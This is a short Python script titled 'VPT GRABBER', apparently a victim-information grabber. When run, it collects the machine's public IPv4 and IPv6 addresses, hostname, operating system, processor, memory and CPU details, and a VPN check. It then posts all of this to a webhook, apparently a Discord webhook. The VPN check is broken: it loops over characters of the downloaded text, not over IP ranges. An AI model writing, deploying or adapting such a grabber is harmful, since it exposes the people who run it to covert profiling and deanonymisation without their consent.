import requests
import json
import platform
import psutil

# Function to check if the IP is from a known VPN provider
def is_vpn(ip):
    # List of known VPN IP ranges (for demonstration; this should be expanded)
    vpn_ips = requests.get("https://raw.githubusercontent.com/Stoltdansker/IP-Grabber/main/vpnip.txt").text
    
    # This is a basic check; for real detection, you'd need a more sophisticated method
    for range in vpn_ips:
        if ip.startswith(range.split('/')[0]):
            return True
    return False

memory = psutil.virtual_memory()

# Gets Information
ip = requests.get("https://api.ipify.org/").text
ipv6 = requests.get("https://api64.ipify.org/").text
sys = platform.system()
node = platform.node()
ver = platform.version()
mach = platform.machine()
proc = platform.processor()
arch = platform.architecture()[0]

# Check if the user has a VPN activated
vpn_status = "Active" if is_vpn(ip) else "Not Active"

webhook = "webhook-url-here"

# Makes the embed
json_data = {
    "content": "",
    "embeds": [
        {
            "description": f"**IP Information**📲\nIP: {ip}\nIPV6: {ipv6}\n\n**System Information**🖥\nSystem: {sys}\nHostName: {node}\nVersion: {ver}\nMachine: {mach}\nProcessor: {proc}\nArchitecture: {arch}\n\n**Memory Information**🧠\nTotal Memory: {memory.total / (1024 ** 3):.2f} GB\nAvailable Memory: {memory.available / (1024 ** 3):.2f} GB\nUsed Memory: {memory.used / (1024 ** 3):.2f} GB\nMemory Percentage Used: {memory.percent}%\n\n**CPU Information**❤️\nCPU Cores: {psutil.cpu_count(logical=False)} (Physical)\nLogical CPU Cores: {psutil.cpu_count(logical=True)} (Logical)\nCPU Frequency: {psutil.cpu_freq().current} MHz\n\n**VPN Status**🔒\nVPN: {vpn_status}",
            "fields": [],
            "title": "VPT GRABBER"
        }
    ],
    "components": [],
    "actions": {}
}

# Sends the embed
def grab():
    requests.post(webhook, data=json.dumps(json_data), headers={"Content-Type": "application/json"})

# Runs the function
grab()
